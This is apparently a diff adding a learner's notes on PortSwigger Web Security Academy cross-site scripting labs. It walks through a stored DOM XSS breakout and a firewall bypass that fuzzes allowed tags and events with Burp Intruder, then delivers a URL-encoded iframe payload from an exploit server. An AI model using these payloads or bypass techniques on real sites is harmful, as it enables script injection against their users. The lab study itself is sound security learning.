@@ -106,3 +106,37 @@ Maybe we can break our from here...I searched on : "-alert(1)" and this what i g
 so i will modify my search to \"-alert(1)// >>> // is commenting out the rest of the line
 {"results":[],"searchTerm":"\\"-alert(1)//"} >>> okay it run down, but it commented our the } what is a must...so next modify: \"-alert(1)}// >>>and it worked.
 
+Task 13:
+///Lab: Stored DOM XSS///
+
+On the opening page do a comment, and inspect the comment source. The comment reflecten between <p> </p>. I've tried putting in the alert as script, tried a lot of variations, but then i noticed that a few lines
+upper there is a <img class="avatar" src="/resources/images/avatarDefault.svg"> line, so maybe <img src=1 onerror=alert(1)> will work...
+So if we want to break out and use our payload then comment this: </p><img src=1 onerror=alert(1)><p>.
+
+Task 14:
+///Lab: Reflected XSS into HTML context with most tags and attributes blocked///
+
+I've searched on <img src=1 onerror=alert(1)>, and <script>alert(1)</script>, i got an error "tag is not allowed", i've tried to figure out which tag is not allowed...maybe <>? but nope.
+ive tried onerror=print(), didnt work...
+So as in the readme there is a firewall. It is not allowing the ususal tags, but it allows the <> signs...so every searh reflected in the url, so all we have to do is to try until there will be a working tag.
+There is a XSS cheat-sheet at https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
+We can copy all the tags from here...So in burpsuit send the search's get request to intruder. Change this part:GET /?search=%3C%3E HTTP/2 to GET /?search=<> HTTP/2 and put a position between the to marks.
+And from the cheat-sheet site copy all the tags, and insert them into the payloads configuration. Every bad try we got back a HTTP/2 400 Bad Request if the result is 200 we have a win.
+Lets run the attack. We got 2 results "body" and "xss" so our payload will be <body...something...> So go back to the cheat-sheet's page, and click on body tag, and lets see how these loads looks like...
+<body onafterprint=alert(1)> ....<style>@keyframes slidein {}</style><body style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></body>
+etc etc...so our form will be : <body ....xyz...=print()>all we have to do is the same like we did before redo the intruder with <body §§=print()> copy all the events to clipboard and paste them into the payload
+configuration, and run the attack and if we have http 200 we won...And we have a lot of wins...
+I've tried them 1by1...
+<body oncontentvisibilityautostatechange=print() style=display:block;content-visibility:auto> -->this one is working so lets check if its solves our lab...Go to the exploit server, and type into the "body" part:
+<iframe src="https://0a8300150483596d809403b9006b00b0.web-security-academy.net/?search=<body oncontentvisibilityautostatechange=print() style=display:block;content-visibility:auto>">
+store and explore it...it works, but it didnt solved the lab. So we will need another one...
+Im looking for only "Event handlers that do not require user interaction". the next one is oneresize...<body onresize="print()"> so we will copy this into our payload:
+<iframe src="https://0a8300150483596d809403b9006b00b0.web-security-academy.net/?search="><body onresize=print()>">
+But remember we will upload this into a html code... so " = %22 ; > = %3E ; < = %3C ; space = %20
+<iframe src="https://0a8300150483596d809403b9006b00b0.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E"> BUT! we need a plus tag, because we upload our payload to the server, but it wont load in
+automatically we have to trigger it somehow. And since our payload is a resizing payload we can trigger it with the "onload" tag, because this will automatically change the iframe's height while the page is loading in.
+<iframe src="https://0a8300150483596d809403b9006b00b0.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.height='200px'>
+
+Task 15:
+///Lab: Reflected XSS into HTML context with all tags blocked except custom ones///
+
